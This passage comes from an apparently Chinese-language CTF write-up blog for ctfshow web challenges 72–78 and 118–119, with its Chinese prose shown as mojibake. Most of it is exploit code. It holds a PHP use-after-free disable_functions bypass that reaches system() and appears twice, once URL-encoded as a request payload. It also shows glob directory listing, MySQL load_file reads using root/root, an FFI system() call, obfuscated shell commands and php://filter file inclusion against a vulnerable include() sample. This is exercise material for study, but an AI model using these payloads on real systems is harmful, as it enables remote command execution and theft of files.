<span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éœ€è¦è¿›è¡Œurlç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=%3F%3E%3C%3Fphp%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220923163826686.png"></p><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220923185400878.png"></p><p>è¯•ç”¨ä¸Šä¸€ä¸ªé¢˜çš„æ–¹æ³•ï¼Œå…ˆglobç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220924130859769.png"></p><p>å¯ä»¥includeåŒ…å«è¿›å»</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220924131308340.png"></p><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>ç™½å«–web73çš„åšæ³•</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›å¯ä½¿ç”¨çš„è¿›ç¨‹å»è¯»å–flagã€‚è¿™é‡Œä½¿ç”¨PDO(PHP Database Object)å»æ‰§è¡Œsqlè¯­å¥è¿›è€Œè¯»å‡ºflag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flagx.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dbnameå¯ä»¥æ˜¯mysqlï¼Œåªè¦æ˜¯mysqlæ•°æ®åº“é‡Œé¢å­˜åœ¨çš„æ•°æ®åº“åï¼ˆdbnameï¼‰å°±å¯ä»¥äº†<br>è¿˜è¦æ•°æ®åº“å¯†ç æ˜¯å¼±å¯†ç  root&#x2F;root</p><h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p><img src="C:\Users\cyr\AppData\Roaming\Typora\typora-user-images\image-20220924141254016.png"></p><p>globç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220924141402053.png"></p><p>include()ä¼šæŠ¥é”™ï¼Œä½¿ç”¨mysql_loadfileè¯»å–æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220924141153156.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220924141910774.png"></p><h4 id="mysql-load-file-MySQLä½¿ç”¨LOAD-FILE-å‡½æ•°æ–¹æ³•"><a href="#mysql-load-file-MySQLä½¿ç”¨LOAD-FILE-å‡½æ•°æ–¹æ³•" class="headerlink" title="mysql load file_MySQLä½¿ç”¨LOAD_FILE()å‡½æ•°æ–¹æ³•"></a>mysql load file_MySQLä½¿ç”¨LOAD_FILE()å‡½æ•°æ–¹æ³•</h4><p>åœ¨mysqlä¸­ï¼Œload_file()å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸º<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>è¿”å›ã€‚</p><p><a href="https://blog.csdn.net/weixin_35141284/article/details/113431408">ä¼ é€å¸¦</a></p><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>ç™½å«–75çš„æ–¹æ³•</p><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>å…ˆç”¨globåè®®ç»•è¿‡ï¼Œå‘ç°ä¸¤ä¸ªä¸flagæœ‰å…³çš„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925120001140.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//æ²¡æœ‰å›æ˜¾çš„</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925150047190.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925150137314.png"></p><h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>å¯ä»¥æ‰§è¡Œ$IFS   å¯ä»¥è°ƒç”¨ç³»ç»Ÿå˜é‡ï¼Œåœ¨ç³»ç»Ÿå˜é‡é‡Œé¢æ„é€ (ç³»ç»Ÿç¯å¢ƒå˜é‡ç›®å½•ï¼Œæœ‰næœ‰l)</p><p>nl    å–æœ€åä¸€ä½   <code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220926194409679.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925201937096.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925202429503.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925202449881.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220925202513951.png"></p><h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p><a href="https://blog.csdn.net/m0_48780534/article/details/125095631?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166539936216782395311639%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166539936216782395311639&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125095631-null-null.142%5Ev52%5Epc_rank_34_2,201%5Ev3%5Econtrol_1&utm_term=ctfshow%20web%E5%85%A5%E9%97%A8119&spm=1018.2226.3001.4187">å‚è€ƒåšå®¢</a></p><p>æŸ¥çœ‹PHPç‰ˆæœ¬ï¼Œç”¨çš„æ˜¯è°·æ­Œçš„ä¸€ä¸ªæ’ä»¶  <strong>wappalyzer</strong></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221010185956584.png"></p><h2 id="æ–‡ä»¶åŒ…å«ï¼ˆ78â€”88-116â€”117ï¼‰"><a href="#æ–‡ä»¶åŒ…å«ï¼ˆ78â€”88-116â€”117ï¼‰" class="headerlink" title="æ–‡ä»¶åŒ…å«ï¼ˆ78â€”88  116â€”117ï¼‰"></a>æ–‡ä»¶åŒ…å«ï¼ˆ78â€”88  116â€”117ï¼‰</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> includeåŒ…å«ï¼Œç›´æ¥ç”¨ä¼ªåè®®</p><p><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p><img 